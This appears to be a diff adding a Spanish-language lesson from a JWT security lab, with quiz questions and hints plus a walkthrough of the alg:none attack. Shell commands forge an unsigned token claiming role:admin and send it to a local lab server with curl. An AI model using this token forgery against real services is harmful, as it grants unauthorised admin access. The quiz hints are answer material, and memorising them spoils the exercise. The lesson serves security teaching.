@@ -1,0 +1,54 @@
+---
+index: 1
+title: "Anatomía del JWT y ataque alg:none"
+questions:
+  - id: jwt-security-t01-q01
+    prompt: "¿Cuántas partes tiene un JWT separadas por puntos?"
+    hint: "header.payload.signature"
+    kind: text
+  - id: jwt-security-t01-q02
+    prompt: "¿Qué algoritmo JWT no requiere firma?"
+    hint: "none — literalmente 'sin algoritmo'."
+    kind: text
+  - id: jwt-security-t01-q03
+    prompt: "Envía la flag que obtienes al usar alg:none con role:admin."
+    hint: "Decodifica tu token, cambia alg a none y role a admin, elimina la firma, envíalo a /login"
+    kind: flag
+---
+
+## Las 3 partes de un JWT
+
+```text
+eyJhbGciOiJIUzI1NiJ9 . eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9 . SflKxwRJSMeKKF2QT4
+└─── header (alg) ──┘   └────── payload (claims) ──────────────┘   └─ signature ─┘
+```
+
+Decodifica cada parte (son base64url):
+
+```bash
+# En el lab, copia tu token de la página principal y decodifica:
+echo 'eyJhbGciOiJIUzI1NiJ9' | base64 -d    # {"alg":"HS256"}
+echo 'eyJ1c2VyIjoiZ3Vlc3Q... ' | base64 -d # {"user":"guest","role":"user"}
+```
+
+## El ataque alg:none
+
+El JWT verifica la firma SOLO si el algoritmo lo requiere. Si cambias el header a
+`"alg":"none"`, muchos servidores (incorrectamente) aceptan el token sin verificar:
+
+```bash
+# 1. Crea el header malicioso
+HEADER=$(echo -n '{"alg":"none"}' | base64 | tr -d '=' | tr '/+' '_-')
+
+# 2. Crea el payload con role:admin
+PAYLOAD=$(echo -n '{"user":"hacker","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-')
+
+# 3. Token sin firma (nota el punto final vacío)
+TOKEN="${HEADER}.${PAYLOAD}."
+
+# 4. Envíalo
+curl "http://127.0.0.1:18094/login?token=${TOKEN}"
+```
+
+La respuesta contiene las 3 flags — el servidor aceptó el token sin firma porque
+el header decía `alg:none`.
